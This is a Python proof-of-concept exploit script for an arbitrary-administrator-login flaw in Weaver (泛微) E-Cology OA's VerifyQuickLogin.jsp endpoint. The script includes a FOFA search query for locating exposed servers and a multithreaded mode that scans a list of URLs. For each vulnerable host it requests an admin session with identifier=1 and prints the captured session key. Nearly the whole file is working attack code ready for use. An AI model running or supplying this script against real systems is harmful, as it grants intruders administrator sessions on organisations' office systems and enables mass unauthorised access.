#FOFA: app="泛微-协同办公OA"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    timeout = 3
    vurl = urllib.parse.urljoin(target, '/mobile/plugin/VerifyQuickLogin.jsp')
    payload_data = 'identifier=1&language=1&ipaddress=x.x.x.x'
    try:
        rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        json_rep = json.loads(rep.text)
        if len(json_rep['sessionkey']) > 0 and json_rep['message'] == "1":
            result['vulnerable'] = True
            result['sessionkey'] = json_rep['sessionkey']
            print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()